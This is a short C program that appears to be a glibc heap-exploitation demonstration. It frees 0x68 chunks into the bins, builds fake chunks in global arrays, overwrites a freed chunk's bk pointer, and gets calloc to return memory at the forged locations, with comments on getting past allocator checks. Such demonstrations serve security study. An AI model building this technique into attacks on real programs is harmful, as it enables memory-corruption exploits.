#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>
#include<stdint.h>

size_t stack1[0x100];
size_t stack2[0x100];
size_t stack3[0x100];
size_t* ps[10]={0};
int main(){
    fprintf(stderr,"stack1: %p\nstack2: %p\nstack3: %p\n",stack1,stack2,stack3);
    for(int i=0;i<8;i++)
        ps[i]=malloc(0x68);
    malloc(0x1000);
    for(int i=0;i<8;i++)
        free(ps[i]);
    malloc(0x1000);

    stack1[0]=0;
    stack1[1]=0x20; // bypass calloc memset, above 0x20 is OK.
    stack1[2]=(size_t)ps[7]-0x10;
    stack1[3]=(size_t)stack2;

    stack2[0]=0;
    stack2[1]=0x68;
    stack2[2]=(size_t)stack1;
    stack2[3]=(size_t)stack3; // if this one point to stack2, we can also get p2!

    stack3[0]=0;
    stack3[1]=0;
    stack3[2]=(size_t)stack2;
    stack3[3]=0;

    ps[7][1]=(size_t)stack1; // small->bk=stack1
    calloc(1,0x68);
    void*p1=calloc(1,0x68);
    void*p2=calloc(1,0x68); 
    fprintf(stderr,"p1: %p\np2: %p\n",p1,p2);
    return 0;
}
